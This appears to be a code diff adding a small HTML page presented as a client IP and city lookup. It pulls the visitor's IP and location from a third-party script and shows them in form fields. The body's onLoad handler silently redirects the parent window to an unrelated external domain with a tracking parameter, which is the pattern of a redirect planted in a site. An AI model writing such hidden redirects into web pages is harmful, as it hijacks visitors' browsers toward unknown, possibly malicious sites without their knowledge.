@@ -1,0 +1,24 @@
+
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<title>获取客户端IP</title>
+<script src="http://pv.sohu.com/cityjson?ie=utf-8"></script> 
+</head>
+<body onLoad="parent.location='https://www.maitube.com/7/?i=fqrm'">
+ <img src="/1232.jpg" >
+ 
+城市+IP：<input type="text" id="city" name="city"><br/>
+IP地址：<input type="text" id="ip" name="ip"><br/>
+城市：<input type="text" id="cname" name="cname"><br/>
+<script type="text/javascript">  
+var city = returnCitySN["cip"]+','+returnCitySN["cname"]; //定义城市IP
+var ip = returnCitySN["cip"];	//定义IP
+var cname = returnCitySN["cname"];	//定义城市
+//document.write(city1);
+document.getElementById("city").value=city;	//获取城市和IP
+document.getElementById("ip").value=ip;		//只获取ip
+document.getElementById("cname").value=cname; //只获取城市
+</script>
+</body>
+</html>
